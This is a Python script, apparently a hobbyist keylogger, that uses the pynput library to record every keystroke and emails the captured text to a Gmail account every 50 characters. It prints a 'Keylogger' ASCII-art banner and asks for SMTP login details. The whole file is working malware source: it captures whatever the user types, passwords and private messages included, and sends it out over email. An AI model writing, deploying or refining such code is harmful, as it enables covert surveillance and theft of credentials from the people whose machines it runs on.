import getpass
import smtplib

# you have to install pynput with the following command
# pip install pynput
from pynput.keyboard import Key, Listener

# use text to ASCII art converter ( Puffy )
print('''
 _   _                _                                     
( ) ( )              (_ )                                   
| |/'/'   __   _   _  | |    _      __     __     __   _ __ 
| , <   /'__`\( ) ( ) | |  /'_`\  /'_ `\ /'_ `\ /'__`\( '__)
| |\`\ (  ___/| (_) | | | ( (_) )( (_) |( (_) |(  ___/| |   
(_) (_)`\____)`\__, |(___)`\___/'`\__  |`\__  |`\____)(_)   
              ( )_| |            ( )_) |( )_) |             
              `\___/'             \___/' \___/'             
''')

# set up email
# note: you have to allow access at security for less secure apps,
# otherwise google won't allow the authentication for the app 
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email,password)

# logger
full_log = ''
word = ''
email_char_limit = 50 #sends mail every 50 character

def on_press(key):
  global word
  global full_log
  global email
  global email_char_limit

  if key == Key.space or key == Key.enter:
    word += ' '
    full_log += word
    word = ''
    if len(full_log) >= email_char_limit:
      send_log()
      full_log = ''
  elif key == Key.shift_l or key == Key.shift_r:
    return
  elif key == Key.backspace:
    word = word[:-1]
  else:
    char = f'{key}'
    char = char[1:-1]
    word += char

  if key == Key.esc:
    return False

def send_log():
  server.sendmail(
    email,
    email,
    full_log
  )

with Listener( on_press=on_press ) as listener:
  listener.join()